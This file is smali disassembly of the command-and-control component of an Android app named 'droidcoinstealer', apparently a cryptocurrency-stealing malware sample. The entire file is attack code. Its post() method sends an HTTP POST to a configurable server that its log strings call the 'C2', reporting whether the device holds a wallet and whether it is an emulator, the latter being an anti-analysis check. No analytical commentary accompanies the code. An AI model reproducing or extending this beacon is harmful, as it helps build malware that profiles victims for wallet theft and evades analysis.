.class Lcom/example/droidcoinstealer/C2;
.super Landroid/os/AsyncTask;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask<",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        "Ljava/lang/Void;",
        ">;"
    }
.end annotation


# instance fields
.field hasWallet:Ljava/lang/String;

.field isEmulated:Ljava/lang/String;

.field path:Ljava/lang/String;

.field port:Ljava/lang/Integer;

.field url:Ljava/lang/String;


# direct methods
.method constructor <init>()V
    .locals 0

    .line 109
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 0

    .line 109
    check-cast p1, [Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lcom/example/droidcoinstealer/C2;->doInBackground([Ljava/lang/Void;)Ljava/lang/Void;

    move-result-object p1

    return-object p1
.end method

.method protected varargs doInBackground([Ljava/lang/Void;)Ljava/lang/Void;
    .locals 1
    .param p1, "params"    # [Ljava/lang/Void;

    .line 122
    invoke-virtual {p0}, Lcom/example/droidcoinstealer/C2;->post()V

    .line 123
    const/4 v0, 0x0

    return-object v0
.end method

.method protected bridge synthetic onPostExecute(Ljava/lang/Object;)V
    .locals 0

    .line 109
    check-cast p1, Ljava/lang/Void;

    invoke-virtual {p0, p1}, Lcom/example/droidcoinstealer/C2;->onPostExecute(Ljava/lang/Void;)V

    return-void
.end method

.method protected onPostExecute(Ljava/lang/Void;)V
    .locals 0
    .param p1, "result"    # Ljava/lang/Void;

    .line 128
    invoke-super {p0, p1}, Landroid/os/AsyncTask;->onPostExecute(Ljava/lang/Object;)V

    .line 129
    return-void
.end method

.method protected onPreExecute()V
    .locals 0

    .line 118
    invoke-super {p0}, Landroid/os/AsyncTask;->onPreExecute()V

    .line 119
    return-void
.end method

.method public post()V
    .locals 12

    .line 133
    const-string v0, "DROIDCOINSTEALER"

    new-instance v1, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v1}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 134
    .local v1, "httpclient":Lorg/apache/http/client/HttpClient;
    const/4 v2, 0x0

    .line 136
    .local v2, "address":Ljava/net/URI;
    :try_start_0
    new-instance v11, Ljava/net/URI;

    const-string v4, "http"

    const/4 v5, 0x0

    iget-object v6, p0, Lcom/example/droidcoinstealer/C2;->url:Ljava/lang/String;

    iget-object v3, p0, Lcom/example/droidcoinstealer/C2;->port:Ljava/lang/Integer;

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v7

    iget-object v8, p0, Lcom/example/droidcoinstealer/C2;->path:Ljava/lang/String;

    const/4 v9, 0x0

    const/4 v10, 0x0

    move-object v3, v11

    invoke-direct/range {v3 .. v10}, Ljava/net/URI;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;ILjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    move-object v2, v11

    .line 140
    nop

    .line 141
    new-instance v3, Lorg/apache/http/client/methods/HttpPost;

    invoke-direct {v3, v2}, Lorg/apache/http/client/methods/HttpPost;-><init>(Ljava/net/URI;)V

    .line 142
    .local v3, "httppost":Lorg/apache/http/client/methods/HttpPost;
    new-instance v4, Ljava/util/ArrayList;

    const/4 v5, 0x2

    invoke-direct {v4, v5}, Ljava/util/ArrayList;-><init>(I)V

    .line 143
    .local v4, "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    new-instance v5, Lorg/apache/http/message/BasicNameValuePair;

    iget-object v6, p0, Lcom/example/droidcoinstealer/C2;->hasWallet:Ljava/lang/String;

    const-string v7, "hasWallet"

    invoke-direct {v5, v7, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v4, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 144
    new-instance v5, Lorg/apache/http/message/BasicNameValuePair;

    iget-object v6, p0, Lcom/example/droidcoinstealer/C2;->isEmulated:Ljava/lang/String;

    const-string v7, "isEmulated"

    invoke-direct {v5, v7, v6}, Lorg/apache/http/message/BasicNameValuePair;-><init>(Ljava/lang/String;Ljava/lang/String;)V

    invoke-interface {v4, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 146
    :try_start_1
    new-instance v5, Lorg/apache/http/client/entity/UrlEncodedFormEntity;

    invoke-direct {v5, v4}, Lorg/apache/http/client/entity/UrlEncodedFormEntity;-><init>(Ljava/util/List;)V

    invoke-virtual {v3, v5}, Lorg/apache/http/client/methods/HttpPost;->setEntity(Lorg/apache/http/HttpEntity;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_1

    .line 150
    nop

    .line 153
    :try_start_2
    invoke-interface {v1, v3}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v5

    .line 154
    .local v5, "response":Lorg/apache/http/HttpResponse;
    invoke-interface {v5}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v0, v6}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 157
    nop

    .end local v5    # "response":Lorg/apache/http/HttpResponse;
    goto :goto_0

    .line 155
    :catchall_0
    move-exception v5

    .line 156
    .local v5, "t":Ljava/lang/Throwable;
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "Connection to C2 failed: "

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/Throwable;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v0, v6}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 158
    .end local v5    # "t":Ljava/lang/Throwable;
    :goto_0
    return-void

    .line 147
    :catchall_1
    move-exception v5

    .line 148
    .restart local v5    # "t":Ljava/lang/Throwable;
    const-string v6, "Failed to create C2-data"

    invoke-static {v0, v6}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 149
    return-void

    .line 137
    .end local v3    # "httppost":Lorg/apache/http/client/methods/HttpPost;
    .end local v4    # "nameValuePairs":Ljava/util/List;, "Ljava/util/List<Lorg/apache/http/NameValuePair;>;"
    .end local v5    # "t":Ljava/lang/Throwable;
    :catchall_2
    move-exception v3

    .line 138
    .local v3, "t":Ljava/lang/Throwable;
    const-string v4, "Failed to create URI"

    invoke-static {v0, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 139
    return-void
.end method
